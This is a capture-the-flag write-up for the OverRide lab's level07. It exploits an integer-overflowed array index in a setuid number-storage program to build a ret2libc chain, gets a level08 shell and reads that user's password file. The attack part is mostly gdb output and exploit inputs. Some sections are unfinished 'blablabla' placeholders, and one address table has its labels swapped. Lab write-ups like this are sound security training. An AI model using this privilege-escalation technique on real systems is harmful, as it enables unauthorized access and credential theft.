# LEVEL07

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
level07@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level08` privileges**.

```bash
blablabla
blablabla
blablabla
```

blablabla

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
[...]
```

### Program Behavior

#### main function

blablabla

#### read_number function

blablabla

#### store_number function

blablabla

## 3. Identify The Vulnerability

With the store and read feature that miss protection, we can found the position on saved EIP from the data storage, and overwrite it.

Like that, we will be able to procedd to a ret2libc attack.

With this stack partern :

```
EBP + 12	[  arg 2  ]		[ "/bin/sh" address ]
EBP + 8		[  arg 1  ]		[ exit address ]
EBP + 4		[SAVED EIP]		[ system address ]
```

### Exploit Developpment

The array is of a size of 100 but we can go further. So will we write after the table, in the stack, directly via the store command of the program.
And we will setup the value to create a ret2libc when we will stop the program.

### Get Exploit Values

For that we need to found : 
- system address
- exit address *(optional)*
- "/bin/sh" address

```bash
(gdb) p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit 
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 2592
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

So we got :
```
system address				0xf7e6aed0
exit address *(optional)*	0xf7e5eb70
"/bin/sh" address			0xf7f897ec
```

### Found SAVED EIP Position

With `gdb` command `info frame` we can get the information of the stack frame:

```bash
(gdb) info frame
Stack level 0, frame at 0xffffd6a0:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd698, args: 
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
  ebp at 0xffffd698, eip at 0xffffd69c
```

So saved eip is at `0xffffd69c`.

---

```c
undefined4 local_1bc [100];
local_2c = store_number(local_1bc);
```

```s
   0x080488e3 <+448>:	lea    0x24(%esp),%eax
   0x080488e7 <+452>:	mov    %eax,(%esp)
   0x080488ea <+455>:	call   0x8048630 <store_number>
```

With the c and assembly dump, we see that the data storage is called `local_1bc` and stored at `%esp+0x24`.

```bash
(gdb) p $esp+0x24
$2 = (void *) 0xffffd4d4
```

So the data array is at `0xffffd4d4`.

---

```
0xffffd69c - 0xffffd4d4 = 456 bytes
```

But there is a problem :
```
456 bytes / 4 bytes = 114 characters
____________________________________

114 % 3 = 0
```

Because of this `if` statement :
```c
  if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
```

We cannot write this position as a storage position.

### UInt Overflow

But because of how the array position is selected :

```c
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
```

We can proceed to an uint overflow to get the position we want.

uintmax is `4294967295`. So uint + 1 : `4294967296` is equal to `0`.
From this :
```
4294967296 / 4 = 1073741824

(1073741824 + 114) * 4 = 456

1073741824 + 114 = 1073741938
```

So by sending the position `1073741938`, we will write at the 114th element of the data storage.

---

### Final Values

We need to convert the addresses in decimal, because it will be stored as values :

```
system	:	0xf7e6aed0	:	4159090384

exit	:	0xf7e5eb70	:	4159040368

/bin/sh	:	0xf7f897ec	:	4160264172
```

And with the position of SAVED EIP at table[114], we can deduce :

```
EBP + 12	[  arg 2  ]	 |	[ table[116] ]	:	system	:	0xf7e6aed0	=	4159090384
EBP + 8		[  arg 1  ]	 |	[ table[115] ]	:	exit	:	0xf7e5eb70	=	4159040368

EBP + 4		[SAVED EIP]	 |	[ table[114] ]	:	bin/sh	:	0xf7f897ec	=	4160264172
```

So will we store :

```
value: 4159090384
index: 1073741938

value: 4159040368
index: 115

value: 4160264172
index: 116
```

## 4. Capture The Flag

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store	
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
XXX
$ exit
```